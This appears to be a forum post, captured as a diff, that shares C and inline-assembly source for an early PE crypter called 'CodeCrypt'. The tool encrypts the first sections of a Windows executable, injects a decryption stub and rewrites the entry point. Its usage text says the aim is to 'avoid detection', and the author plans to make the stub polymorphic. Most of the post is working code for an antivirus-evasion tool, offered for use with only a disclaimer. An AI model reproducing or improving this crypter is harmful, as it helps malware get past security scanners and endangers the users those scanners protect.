@@ -1,0 +1,667 @@
+i've set it to encrypt the 1st two sections on the assumption these are CODE and DATA.
+
+It's hardcoded not to look further than this, as I'm not certain which other sections can be safely encrypted...
+
+The stub is getting a bit nasty asm now, but it's still managable. Next step will be to add proper encryption and make the stub polymorphic.
+
+Here's the code: 
+
+
+CODE
+
+/*
+
+CodeCrypt 0.0 Written by Tibbar @ GSO.  You may use this code in your own projects
+for non-commercial purposes provided you give credit to the author.
+
+This is provided for educational purposes only.
+No legal reponsibility is held or accepted by the author for misuse of this code.
+
+*/
+
+#include <string.h>
+#include <stdio.h> 
+
+#include "windows.h"
+#include "limits.h"
+
+
+void FunctionStart(){}
+
+// this function will be copied into binary and will become the entry point
+// it decrypts the code section and jmp's to the original entry point.
+__declspec( naked )void DecryptAndStart()
+{
+    // retrieve original entry point, which will live at eip - 4
+    // and codesize at eip - 2
+    DWORD eipVal;
+    DWORD codeSize;
+    DWORD entryPt;
+    
+    _asm
+    {
+ // thanks to IDESPinner for this trick
+ call jj; // think relative, this means go to next comand
+ jj:
+ pop EAX; // pop the EIP off the stack into EAX since it got pushed by the call
+
+ mov EBX, EAX; // save eip in ebx - keep it safe for a while
+
+ mov ECX, [EAX - 0x9]; // no of sections
+ push ECX; // push no of sections on stack
+
+ mov EAX, 0x11;
+ add EAX, ECX;
+ add EAX, ECX;
+ add EAX, ECX;
+ add EAX, ECX;
+ add EAX, ECX;
+ add EAX, ECX;
+ add EAX, ECX;
+ add EAX, ECX; // each section info is 8 bytes
+
+ mov EDX, EBX;
+ sub EDX, EAX;
+ mov ECX, [EDX]; // original entry point rva in ECX (EAX - 0x15 == storageSpot )
+
+ add EDX, 4;
+
+ mov EAX, [EDX]; // imagebase in EAX
+
+ add EDX, 4; // move to next data item (first section data)
+
+ add ECX, EAX; // actual address of entrypoint in ECX
+ push ECX; // keep it on stack for later
+ push EAX; // image base on stack
+
+ push EDX; // backward rva from eip initial to current data item
+ sub EDX, EDX;  // zero at EDX
+ 
+outerLoop:
+ mov ECX, [ESP+0xC]; // no  of sections
+ CMP EDX, ECX;
+ jz theEnd;
+ pop ECX; // was EDX earlier for backward rva from eip to data
+ push EDX; // save counter for next loop
+
+ // at ECX we have section data item 1
+
+     // inner loop
+ innerLoop:
+     // now retrieve VirtualAddress and Misc.VirtualSize for this section
+     mov EBX,[ECX]; // VirtualAddress
+     push EBX;
+     mov EDX, [ECX + 0x4]; // Misc.VirtualSize
+
+     mov EAX, [ESP + 0x8]; // get imagebase back
+     add EAX, EBX; // so EAX is pointer to section start
+
+     add ECX, 0x8; // fastforward to next section for next loop
+     push ECX; // save this for next loop (eip at entry)
+
+     // now we loop from [EAX] to [EAX+EDX]
+     mov EBX, EAX; // put code start address in EBX
+     add EDX, EAX; // last item of code to decrypt in EDX
+ 
+     StartLoop:
+     CMP EBX, EDX; // when these are the same, stop
+     JZ StopLooping
+   mov AL, BYTE PTR [EBX] // get value at address EBX
+   dec AL;    // decrypt it
+   mov BYTE PTR [EBX], AL  // put decrypted value back in right place
+   inc EBX;
+     jmp StartLoop;
+     StopLooping:
+
+ // now we must move to next section
+ pop EBX;  // get eip back
+ pop EAX;  // get section pointer back
+ pop EDX;  // get i
+ inc EDX; // i++
+ push ECX;
+
+ jmp outerLoop;
+
+theEnd:
+ pop ECX;
+ pop ECX;
+ pop ECX;
+ jmp ECX;
+    }
+
+}
+
+void FunctionEnd(){}
+
+ULONG __fastcall GetSizeOfImage(
+   IN PVOID pImageBase
+   )
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+
+   // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   // calculate the size
+   ULONG nSizeOfImage = pOptHeader->SizeOfHeaders;
+
+   IMAGE_SECTION_HEADER * pSecHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+   // sum size of all image sections; this will result in the image
+   // size
+   for (int i = 0; i < pFileHeader->NumberOfSections; i++, pSecHeader++)
+       nSizeOfImage += pSecHeader->SizeOfRawData;
+
+   // return size of the executable
+   return nSizeOfImage;
+}
+
+IMAGE_SECTION_HEADER* GetSectionHeader(IN PVOID pImageBase)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+
+   // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   // calculate the size
+   ULONG nSizeOfImage = pOptHeader->SizeOfHeaders;
+
+   IMAGE_SECTION_HEADER * pSecHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+    return pSecHeader;
+}
+
+
+PIMAGE_SECTION_HEADER FindLastSection(DWORD* pImageBase)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+    
+    // get NT header
+   IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)pImageBase+pDosHeader->e_lfanew);
+
+    // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   IMAGE_SECTION_HEADER * sectionHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+    DWORD newSectionOffset;
+    DWORD SectionNum = pNtHeaders->FileHeader.NumberOfSections;
+
+    DWORD currentMaxVA = 0;
+    int pos = 0;
+
+    IMAGE_SECTION_HEADER* tempHeader = sectionHeader;
+    DWORD headerSize = sizeof(IMAGE_SECTION_HEADER);
+    for(int i = 0; i < SectionNum; i++)
+    {
+ if((DWORD)(tempHeader->VirtualAddress) > currentMaxVA) 
+ {
+     currentMaxVA = (DWORD)(tempHeader->VirtualAddress);
+     pos = i;
+ }
+ tempHeader = (IMAGE_SECTION_HEADER*)((DWORD)tempHeader + headerSize);
+    }
+
+    IMAGE_SECTION_HEADER* lastSectionHeader = (IMAGE_SECTION_HEADER*)((DWORD)sectionHeader + pos*sizeof(IMAGE_SECTION_HEADER));
+    return lastSectionHeader;
+}
+
+PIMAGE_SECTION_HEADER FindFirstSection(DWORD* pImageBase)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+    
+    // get NT header
+   IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)pImageBase+pDosHeader->e_lfanew);
+
+    // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   IMAGE_SECTION_HEADER * sectionHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+    return sectionHeader;
+}
+
+
+PIMAGE_SECTION_HEADER FindNextSection(DWORD* pImageBase, PIMAGE_SECTION_HEADER currentSection)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+    
+    // get NT header
+   IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)pImageBase+pDosHeader->e_lfanew);
+
+    // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   IMAGE_SECTION_HEADER * sectionHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+    DWORD newSectionOffset;
+    DWORD SectionNum = pNtHeaders->FileHeader.NumberOfSections;
+
+    if(SectionNum <= 1) return NULL;
+
+    IMAGE_SECTION_HEADER* prevHeader = sectionHeader;
+    IMAGE_SECTION_HEADER* currHeader = (IMAGE_SECTION_HEADER*)((DWORD)sectionHeader + sizeof(IMAGE_SECTION_HEADER));
+    DWORD headerSize = sizeof(IMAGE_SECTION_HEADER);
+    for(int i = 0; i < SectionNum - 1; i++)
+    {
+ if(prevHeader == currentSection) return currHeader;
+ prevHeader = currHeader;
+ currHeader = (IMAGE_SECTION_HEADER*)((DWORD)currHeader + sizeof(IMAGE_SECTION_HEADER));
+    }
+
+    return NULL;
+}
+
+PIMAGE_SECTION_HEADER FindSection(DWORD* pImageBase, DWORD sectionbase)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+    
+    // get NT header
+   IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)pImageBase+pDosHeader->e_lfanew);
+
+    // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   IMAGE_SECTION_HEADER * sectionHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+    DWORD newSectionOffset;
+    DWORD SectionNum = pNtHeaders->FileHeader.NumberOfSections;
+
+    DWORD currentMaxVA = 0;
+    int pos = 0;
+
+    IMAGE_SECTION_HEADER* tempHeader = sectionHeader;
+    DWORD headerSize = sizeof(IMAGE_SECTION_HEADER);
+    for(int i = 0; i < SectionNum; i++)
+    {
+ if(tempHeader->VirtualAddress == sectionbase) 
+ {
+     return tempHeader;
+ }
+ tempHeader = (IMAGE_SECTION_HEADER*)((DWORD)tempHeader + headerSize);
+    }
+
+    return NULL;
+}
+
+void MakeAllSectionsWritable(DWORD* pImageBase)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+    
+    // get NT header
+   IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)pImageBase+pDosHeader->e_lfanew);
+
+    // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   IMAGE_SECTION_HEADER * sectionHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+    DWORD newSectionOffset;
+    DWORD SectionNum = pNtHeaders->FileHeader.NumberOfSections;
+
+    DWORD currentMaxVA = 0;
+    int pos = 0;
+
+    IMAGE_SECTION_HEADER* tempHeader = sectionHeader;
+    DWORD headerSize = sizeof(IMAGE_SECTION_HEADER);
+    for(int i = 0; i < SectionNum; i++)
+    {
+ tempHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;
+ tempHeader = (IMAGE_SECTION_HEADER*)((DWORD)tempHeader + headerSize);
+    }
+
+    return;
+}
+
+PIMAGE_SECTION_HEADER AddSection(DWORD* pImageBase, DWORD codeVirtualStart, DWORD codeSize)
+{
+   // get DOS header
+   IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)pImageBase;
+    
+    // get NT header
+   IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)pImageBase+pDosHeader->e_lfanew);
+
+    // find an offset to the main PE header ...
+   IMAGE_FILE_HEADER * pFileHeader = 
+       (IMAGE_FILE_HEADER *)(((LPBYTE)pImageBase) + 
+                     pDosHeader->e_lfanew + 
+                     sizeof(IMAGE_NT_SIGNATURE));
+
+   // ... and optional PE header
+   IMAGE_OPTIONAL_HEADER * pOptHeader = 
+       (IMAGE_OPTIONAL_HEADER *)(((LPBYTE)pFileHeader) + 
+                     IMAGE_SIZEOF_FILE_HEADER);
+
+   IMAGE_SECTION_HEADER * sectionHeader = 
+       (IMAGE_SECTION_HEADER *)(((LPBYTE)pOptHeader) + 
+                    pFileHeader->SizeOfOptionalHeader);
+
+    DWORD newSectionOffset;
+    DWORD SectionNum = pNtHeaders->FileHeader.NumberOfSections;
+
+    newSectionOffset = (DWORD)sectionHeader
+ +pNtHeaders->FileHeader.NumberOfSections*sizeof(IMAGE_SECTION_HEADER) - (DWORD)pImageBase;
+
+    // check whether there's room for a new section
+    if(pNtHeaders->OptionalHeader.SizeOfHeaders<(newSectionOffset+sizeof(IMAGE_SECTION_HEADER)))
+    {
+ return NULL;
+    }
+
+    // increase SizeOf
+
+    // create a new section
+
+    IMAGE_SECTION_HEADER* newsection = (IMAGE_SECTION_HEADER*)((DWORD)pImageBase + newSectionOffset);
+
+    // go to the last section
+//    for(DWORD i=0;i<(SectionNum-1);i++)
+//    {
+//  PEfile.image_section_header[i].Characteristics=
+//      PEfile.image_section_header[i].Characteristics | IMAGE_SCN_MEM_WRITE;
+//    }
+
+    // start to build the new section
+    DWORD n = sizeof(IMAGE_SECTION_HEADER);
+    CopyMemory(newsection,
+     (IMAGE_SECTION_HEADER*)((DWORD)newsection - n),
+     sizeof(IMAGE_SECTION_HEADER));
+
+    // VirtualAddress...
+/*    DWORD sectionAlignment = pNtHeaders->OptionalHeader.SectionAlignment;
+
+    newsection->VirtualAddress = codeVirtualStart - codeVirtualStart%sectionAlignment;
+    newsection->Misc.VirtualSize = codeSize + codeSize%sectionAlignment;
+
+    // RawSize..
+    DWORD alignment = pNtHeaders->OptionalHeader.FileAlignment;
+    if(codeSize < alignment) newsection->SizeOfRawData = alignment;
+    else newsection->SizeOfRawData = codeSize + codeSize % alignment;
+
+    // Section name
+    int l=(int)strlen(".stub");
+    FillMemory(newsection->Name,8,0x00);
+    CopyMemory(newsection->Name,".stub",l);
+
+    // Characteristics
+    newsection->Characteristics=
+ IMAGE_SCN_MEM_WRITE|
+ IMAGE_SCN_MEM_READ|
+ IMAGE_SCN_MEM_EXECUTE|
+ IMAGE_SCN_CNT_UNINITIALIZED_DATA |
+ IMAGE_SCN_CNT_INITIALIZED_DATA|
+ IMAGE_SCN_CNT_CODE;//0xE00000E0;
+
+    // RawOffset
+    newsection->PointerToRawData = codeVirtualStart - codeVirtualStart%alignment;
+    
+    newsection->Misc.PhysicalAddress = newsection->Misc.VirtualSize;
+    newsection->NumberOfLinenumbers = 0;
+    newsection->NumberOfRelocations = 0;
+    newsection->PointerToLinenumbers = 0;
+    newsection->PointerToRelocations = 0;
+*/    
+    // update the PE header
+    pNtHeaders->FileHeader.NumberOfSections++;
+    // newsection -> will be returned
+    return (PIMAGE_SECTION_HEADER)newsection;
+}
+
+void EncryptSection(IMAGE_SECTION_HEADER* codeSection, DWORD* imageBase)
+{
+    DWORD rawCodePosition = codeSection->PointerToRawData;
+
+    DWORD virtualCodeSize = codeSection->SizeOfRawData;//->Misc.VirtualSize;
+
+    DWORD startpos = (DWORD)imageBase + (DWORD)rawCodePosition;
+    DWORD endpos = startpos + virtualCodeSize;
+    
+ // unprotect code
+    BOOL diditwork = VirtualProtect((void*)startpos, virtualCodeSize, PAGE_READWRITE, NULL);
+    DWORD x = GetLastError();
+
+
+    _asm
+    {
+ mov EBX, startpos;
+ mov EDX, endpos;
+StartLoop:
+ CMP EBX, EDX; // when these are the same, stop
+ JZ StopLooping
+     mov AL, BYTE PTR [EBX] // get value at address EBX
+     inc AL;    // decrypt it
+     mov BYTE PTR [EBX], AL  // put decrypted value back in right place
+     inc EBX;
+ jmp StartLoop;
+StopLooping:
+    }
+}
+
+int main( int argc, char* argv[] ) 
+{
+    if(argc != 2)
+    {
+ printf("*** Code Crypt 0.1 by Tibbar@GovernmentSecurity.org ***\n");
+ printf("***                                                 ***\n");
+ printf("*** Usage: codecrypt filename.exe                   ***\n");
+ printf("*** Will encrypt the 1st two sections to avoid      ***\n");
+ printf("*** detection.  It assumes these are .CODE & .DATA  ***\n");
+ printf("*** Disclaimer: This software is for educational    ***\n");
+ printf("*** purposes only.  No responsibility is held or    ***\n");
+ printf("*** accepted for misuse.                            ***\n");
+ return 0;
+    }
+    HANDLE hFile = CreateFile(
+         argv[1],
+         GENERIC_WRITE | GENERIC_READ,
+         FILE_SHARE_READ | FILE_SHARE_WRITE,
+         NULL,
+         OPEN_EXISTING,
+         FILE_ATTRIBUTE_NORMAL,
+         NULL);
+    if(hFile == NULL)
+    {
+ printf("Invalid filename...exiting!");
+ return 0;
+    }
+    // get size of file
+    LARGE_INTEGER bigInt;
+    BOOL diditWork = GetFileSizeEx(hFile, &bigInt);
+    // assume it's DWORD or less
+    DWORD fileSize = bigInt.LowPart;
+    if(fileSize + 0x2000 >= ULONG_MAX) return 0;
+
+
+    HANDLE hFileMap = CreateFileMapping(
+         hFile,
+         NULL,
+         PAGE_READWRITE,// | SEC_IMAGE,
+         bigInt.HighPart,
+         bigInt.LowPart + 0x2000 ,
+         "myfile");
+    if(hFileMap == NULL)
+    {
+ printf("Unable to create file mapping! Exiting...");
+ return 0;
+    }
+
+// map file into memory
+    LPVOID hMap = MapViewOfFile(
+     hFileMap,
+     FILE_MAP_WRITE,
+     0,
+     0,
+     0);
+    if(hMap == NULL)
+    {
+ printf("Unable to map file into memory! Exiting...");
+ return 0;
+    }
+
+    HMODULE hModule = (HMODULE)hMap;
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+ 
+    IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS*)((DWORD)hModule + pDosHeader->e_lfanew);
+
+    IMAGE_OPTIONAL_HEADER* optionHeader =(IMAGE_OPTIONAL_HEADER *) ((BYTE*)hModule+pDosHeader->e_lfanew+24);    
+
+    VOID* pBaseCode = (VOID*)optionHeader->BaseOfCode;
+    DWORD codeSize = optionHeader->SizeOfCode;
+
+    IMAGE_SECTION_HEADER* sectionHeader = GetSectionHeader(hModule);
+
+
+    // crypt sections
+
+    IMAGE_SECTION_HEADER* sectionHeaderArray[20];
+    for(int i = 0;i <= 20; i++) sectionHeaderArray[i] = NULL;
+
+    sectionHeaderArray[0] = FindFirstSection((DWORD*)hModule);
+    EncryptSection(sectionHeaderArray[0], (DWORD*)hModule);
+
+    int j = 1;
+    while(true)
+    {
+ sectionHeaderArray[j] = FindNextSection((DWORD*)hModule, sectionHeaderArray[j-1]);
+ if(sectionHeaderArray[j] == NULL) break;
+ EncryptSection(sectionHeaderArray[j], (DWORD*)hModule);
+ j++;
+ break;//////////////////////
+    }
+
+    
+    // store rva from new entry point to original entry point at position pBaseCode + fileSize + 2
+
+    DWORD numOfSections = 2;// pNtHeaders->FileHeader.NumberOfSections;
+
+    IMAGE_SECTION_HEADER* lastSection = FindLastSection((DWORD*)hModule);
+
+    DWORD* storageSpot = (DWORD*)((DWORD)hModule + (DWORD)lastSection->SizeOfRawData + (DWORD)lastSection->PointerToRawData);
+
+    *(storageSpot) = (DWORD)optionHeader->AddressOfEntryPoint; //originalEntryPoint- ((DWORD)storageSpot + 2);
+
+    *(storageSpot + 1) = (DWORD)optionHeader->ImageBase;
+
+    for(i = 0; i < numOfSections; i++)
+    {
+ *(storageSpot + 2 + 2*i) = (DWORD)sectionHeaderArray[i]->VirtualAddress;
+ *(storageSpot + 2 + 2*i + 1) = (DWORD)sectionHeaderArray[i]->Misc.VirtualSize;
+    }
+
+    *(storageSpot + 2 + 2*numOfSections) = 2;//pNtHeaders->FileHeader.NumberOfSections;
+
+    // now we need to add our decryption routine to storageSpot + 4 (say)
+    int dSize = (PBYTE)FunctionStart -  (PBYTE)FunctionEnd;
+    DWORD start = (DWORD) FunctionStart;
+    DWORD end = (DWORD) FunctionEnd;
+    DWORD length = (end - start);
+//    memcpy(storageSpot + 2 + pNtHeaders->FileHeader.NumberOfSections + 1, DecryptAndStart, length);
+    CopyMemory(storageSpot + 2 + 2*numOfSections + 1,
+   DecryptAndStart, length);
+
+
+
+    // set new code as executable
+//    IMAGE_SECTION_HEADER* newsection = AddSection((DWORD*)hModule, (DWORD)storageSpot + 4 - (DWORD)hModule, length);
+
+    // to do this we will simply find the last section (i.e. one with highest RVA
+    // and extend this by size needed
+    // and set it to executable
+
+
+    lastSection->Misc.VirtualSize += 0x2000;
+    lastSection->SizeOfRawData += 0x2000;
+    lastSection->Characteristics =    IMAGE_SCN_MEM_WRITE|
+           IMAGE_SCN_MEM_READ|
+           IMAGE_SCN_MEM_EXECUTE|
+           IMAGE_SCN_CNT_UNINITIALIZED_DATA |
+           IMAGE_SCN_CNT_INITIALIZED_DATA|
+           IMAGE_SCN_CNT_CODE;//0xE00000E0;
+
+    // set new entry point
+    optionHeader->SizeOfImage += 0x2000;
+    optionHeader->SizeOfCode += 0x2000;
+    optionHeader->SizeOfInitializedData += 0x2000;
+    optionHeader->AddressOfEntryPoint = (DWORD)lastSection->VirtualAddress + (DWORD)lastSection->SizeOfRawData + 12 + 2*4*numOfSections - 0x2000;
+
+    // finally we need to set the main code section as writable for our stub to decrypt it!
+    
+    MakeAllSectionsWritable((DWORD*)hModule);    
+    printf("Crypted file successfully!");
+}
